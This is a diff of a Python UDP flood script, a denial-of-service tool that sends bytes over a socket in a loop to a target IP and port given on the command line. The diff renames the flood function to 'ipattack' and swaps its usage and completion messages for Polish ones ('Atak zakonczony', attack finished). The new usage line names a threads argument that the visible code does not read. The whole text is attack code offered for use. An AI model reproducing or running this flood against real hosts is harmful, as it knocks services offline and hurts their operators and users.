@@ -2,9 +2,9 @@
 import socket,random,sys,time
 
 if len(sys.argv)==1:
-    sys.exit('Usage: udp.py ip port(0=random) length(0=forever)')
+    sys.exit('\n  Zle uzycie!\n  Poprawne: ip.py <ip> <port> <theards>\n')
 
-def UDPFlood():
+def ipattack():
     port = int(sys.argv[2])
     randport=(True,False)[port==0]
     ip = sys.argv[1]
@@ -19,5 +19,5 @@ def UDPFlood():
             sock.sendto(bytes,(ip,port))
         else:
             break
-    print('')
-UDPFlood()
+    print(' Atak zakonczony.')
+ipattack()
